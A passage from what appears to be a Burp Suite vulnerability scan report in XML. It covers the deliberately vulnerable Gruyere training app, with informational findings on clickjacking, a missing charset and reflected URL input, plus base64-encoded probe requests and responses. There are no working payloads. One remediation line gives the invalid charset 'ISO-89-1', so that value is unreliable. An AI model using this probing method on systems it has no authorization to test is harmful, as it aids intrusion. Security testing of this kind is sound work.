      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiA3YTE5OTdkOTUwM2I2NzNjMzNhMjBkMGUyNTFmNDEzYQ0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDo0OCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwMw0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY29kZWluZGV4MGkzaGl5ZTN6ODwvY29kZT4gd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L2gyPgo8aDI+PC9oMj4KPC9ib2R5PjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3056379323317407744</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex.html]]></path>
    <location><![CDATA[/static/codeindex.html]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4Lmh0bWwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vY29kZS8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDE4IEphbiAyMDE4IDA5OjI3OjQ2IEdNVA0KRXhwaXJlczogVGh1LCAxOCBKYW4gMjAxOCAwOTozNzo0NiBHTVQNCkVUYWc6ICIzbThDQmciDQpYLUNsb3VkLVRyYWNlLUNvbnRleHQ6IDNkNDkyMDliNDQxM2U0MGM4NjNjMmE2MGRhY2M4ZTE0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KU2VydmVyOiBHb29nbGUgRnJvbnRlbmQNCkNvbnRlbnQtTGVuZ3RoOiAyMTg4DQpBZ2U6IDE0MQ0KQ2FjaGUtQ29udHJvbDogcHVibGljLCBtYXgtYWdlPTYwMA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPEhUTUw+CjxIRUFEPgo8VElUTEU+R3J1eWVyZSBDb2RlPC9USVRMRT4KPFNUWUxFPgphIHtjb2xvcjpibGFjazsgdGV4dC1kZWNvcmF0aW9uOm5vbmV9CmE6dmlzaXRlZHtjb2xvcjojNjYwMGNjO30KYTpmb2N1cywgYTpob3ZlciB7Y29sb3I6IzAwMzM5OTsgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7fQphOmFjdGl2ZXtjb2xvcjojY2MzM2NjO30KYmlnIHtjb2xvcjogIzY2MDA2NjsgfQo8L1NUWUxFPgo8L0hFQUQ+CjxCT0RZPgo8VFQ+CjxCPjxCSUc+PEJJRz5HcnV5ZXJlPEJSPkNvZGU8L0JJRz48L0JJRz48L0I+PEJSPjxCUj4KPEEgaHJlZj0iL2NvZGUvZ3J1eWVyZS5weSIgdGFyZ2V0PSJjb2RlcGFnZSI+Z3J1eWVyZS5weTwvQT48QlI+CjxBIGhyZWY9Ii9jb2RlL2RhdGEucHkiIHRhcmdldD0iY29kZXBhZ2UiPmRhdGEucHk8L0E+PEJSPgo8QSBocmVmPSIvY29kZS9zYW5pdGl6ZS5weSIgdGFyZ2V0PSJjb2RlcGFnZSI+c2FuaXRpemUucHk8L0E+PEJSPgo8QSBocmVmPSIvY29kZS9ndGwucHkiIHRhcmdldD0iY29kZXBhZ2UiPmd0bC5weTwvQT48QlI+CjxBIGhyZWY9Ii9jb2RlL3NlY3JldC50eHQiIHRhcmdldD0iY29kZXBhZ2UiPnNlY3JldC50eHQ8L0E+PEJSPgo8QlI+CnJlc291cmNlcy88QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9iYXNlLmNzcyIgdGFyZ2V0PSJjb2RlcGFnZSI+YmFzZS5jc3M8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvZHVtcC5ndGwiIHRhcmdldD0iY29kZXBhZ2UiPmR1bXAuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL2VkaXRwcm9maWxlLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+ZWRpdHByb2ZpbGUuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL2Vycm9yLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+ZXJyb3IuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL2ZlZWQuZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj5mZWVkLmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9ob21lLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+aG9tZS5ndGw8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvbGliLmpzIiB0YXJnZXQ9ImNvZGVwYWdlIj5saWIuanM8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvbG9naW4uZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj5sb2dpbi5ndGw8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvbWFuYWdlLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+bWFuYWdlLmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9tZW51YmFyLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+bWVudWJhci5ndGw8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvbmV3YWNjb3VudC5ndGwiIHRhcmdldD0iY29kZXBhZ2UiPm5ld2FjY291bnQuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL25ld3NuaXBwZXQuZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj5uZXdzbmlwcGV0Lmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9zaG93cHJvZmlsZS5ndGwiIHRhcmdldD0iY29kZXBhZ2UiPnNob3dwcm9maWxlLmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9zbmlwcGV0cy5ndGwiIHRhcmdldD0iY29kZXBhZ2UiPnNuaXBwZXRzLmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy91cGxvYWQuZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj51cGxvYWQuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL3VwbG9hZDIuZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj51cGxvYWQyLmd0bDwvQT48QlI+CjxCUj4KPEk+PEEgaHJlZj0iL2dydXllcmUtY29kZS56aXAiIHRhcmdldD0iX3RvcCI+RG93bmxvYWQgemlwIGZpbGU8L0E+PC9JPjxCUj4KPEJSPgo8QSBocmVmPSIvIiB0YXJnZXQ9Il90b3AiPiZsdDsmbHQ7IGJhY2sgdG8gY29kZWxhYjwvQT4KPC9UVD4KPC9CT0RZPgo8L0hUTUw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5675323941962926080</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex.html]]></path>
    <location><![CDATA[/static/codeindex.html]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4Lmh0bWwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vY29kZS8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDE4IEphbiAyMDE4IDA5OjI3OjQ2IEdNVA0KRXhwaXJlczogVGh1LCAxOCBKYW4gMjAxOCAwOTozNzo0NiBHTVQNCkVUYWc6ICIzbThDQmciDQpYLUNsb3VkLVRyYWNlLUNvbnRleHQ6IDNkNDkyMDliNDQxM2U0MGM4NjNjMmE2MGRhY2M4ZTE0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KU2VydmVyOiBHb29nbGUgRnJvbnRlbmQNCkNvbnRlbnQtTGVuZ3RoOiAyMTg4DQpBZ2U6IDE0MQ0KQ2FjaGUtQ29udHJvbDogcHVibGljLCBtYXgtYWdlPTYwMA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPEhUTUw+CjxIRUFEPgo8VElUTEU+R3J1eWVyZSBDb2RlPC9USVRMRT4KPFNUWUxFPgphIHtjb2xvcjpibGFjazsgdGV4dC1kZWNvcmF0aW9uOm5vbmV9CmE6dmlzaXRlZHtjb2xvcjojNjYwMGNjO30KYTpmb2N1cywgYTpob3ZlciB7Y29sb3I6IzAwMzM5OTsgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7fQphOmFjdGl2ZXtjb2xvcjojY2MzM2NjO30KYmlnIHtjb2xvcjogIzY2MDA2NjsgfQo8L1NUWUxFPgo8L0hFQUQ+CjxCT0RZPgo8VFQ+CjxCPjxCSUc+PEJJRz5HcnV5ZXJlPEJSPkNvZGU8L0JJRz48L0JJRz48L0I+PEJSPjxCUj4KPEEgaHJlZj0iL2NvZGUvZ3J1eWVyZS5weSIgdGFyZ2V0PSJjb2RlcGFnZSI+Z3J1eWVyZS5weTwvQT48QlI+CjxBIGhyZWY9Ii9jb2RlL2RhdGEucHkiIHRhcmdldD0iY29kZXBhZ2UiPmRhdGEucHk8L0E+PEJSPgo8QSBocmVmPSIvY29kZS9zYW5pdGl6ZS5weSIgdGFyZ2V0PSJjb2RlcGFnZSI+c2FuaXRpemUucHk8L0E+PEJSPgo8QSBocmVmPSIvY29kZS9ndGwucHkiIHRhcmdldD0iY29kZXBhZ2UiPmd0bC5weTwvQT48QlI+CjxBIGhyZWY9Ii9jb2RlL3NlY3JldC50eHQiIHRhcmdldD0iY29kZXBhZ2UiPnNlY3JldC50eHQ8L0E+PEJSPgo8QlI+CnJlc291cmNlcy88QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9iYXNlLmNzcyIgdGFyZ2V0PSJjb2RlcGFnZSI+YmFzZS5jc3M8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvZHVtcC5ndGwiIHRhcmdldD0iY29kZXBhZ2UiPmR1bXAuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL2VkaXRwcm9maWxlLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+ZWRpdHByb2ZpbGUuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL2Vycm9yLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+ZXJyb3IuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL2ZlZWQuZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj5mZWVkLmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9ob21lLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+aG9tZS5ndGw8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvbGliLmpzIiB0YXJnZXQ9ImNvZGVwYWdlIj5saWIuanM8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvbG9naW4uZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj5sb2dpbi5ndGw8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvbWFuYWdlLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+bWFuYWdlLmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9tZW51YmFyLmd0bCIgdGFyZ2V0PSJjb2RlcGFnZSI+bWVudWJhci5ndGw8L0E+PEJSPgombmJzcDsmbmJzcDs8QSBocmVmPSIvY29kZS9yZXNvdXJjZXMvbmV3YWNjb3VudC5ndGwiIHRhcmdldD0iY29kZXBhZ2UiPm5ld2FjY291bnQuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL25ld3NuaXBwZXQuZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj5uZXdzbmlwcGV0Lmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9zaG93cHJvZmlsZS5ndGwiIHRhcmdldD0iY29kZXBhZ2UiPnNob3dwcm9maWxlLmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy9zbmlwcGV0cy5ndGwiIHRhcmdldD0iY29kZXBhZ2UiPnNuaXBwZXRzLmd0bDwvQT48QlI+CiZuYnNwOyZuYnNwOzxBIGhyZWY9Ii9jb2RlL3Jlc291cmNlcy91cGxvYWQuZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj51cGxvYWQuZ3RsPC9BPjxCUj4KJm5ic3A7Jm5ic3A7PEEgaHJlZj0iL2NvZGUvcmVzb3VyY2VzL3VwbG9hZDIuZ3RsIiB0YXJnZXQ9ImNvZGVwYWdlIj51cGxvYWQyLmd0bDwvQT48QlI+CjxCUj4KPEk+PEEgaHJlZj0iL2dydXllcmUtY29kZS56aXAiIHRhcmdldD0iX3RvcCI+RG93bmxvYWQgemlwIGZpbGU8L0E+PC9JPjxCUj4KPEJSPgo8QSBocmVmPSIvIiB0YXJnZXQ9Il90b3AiPiZsdDsmbHQ7IGJhY2sgdG8gY29kZWxhYjwvQT4KPC9UVD4KPC9CT0RZPgo8L0hUTUw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1681307976863652864</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex.html]]></path>
    <location><![CDATA[/static/codeindex.html [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4Lmh0bWxpMnQ4NnRjNXgxIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL2NvZGUvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiAwZDU3OGNhMDI5OGNhN2ExMTQyZjdhN2ZmNTllM2E4Yw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDoyOSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwOA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY29kZWluZGV4Lmh0bWxpMnQ4NnRjNXgxPC9jb2RlPiB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvaDI+CjxoMj48L2gyPgo8L2JvZHk+PC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8949707703862980608</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex/]]></path>
    <location><![CDATA[/static/codeindex/ [name of an arbitrarily supplied URL parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The name of an arbitrarily supplied URL parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4Lz92MmJkZWhqYzN1PTEgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiAwOTM2MDRjMDg2MTZiMTczZDk5YzU5NTRlNjAxOTkxNA0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDoyOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwNw0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY29kZWluZGV4Lz92MmJkZWhqYzN1PTE8L2NvZGU+IHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9oMj4KPGgyPjwvaDI+CjwvYm9keT48L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>283811579041064960</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex/]]></path>
    <location><![CDATA[/static/codeindex/ [URL path folder 2]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path folder 2 is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4aGxlcGFxc3JiZS8gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
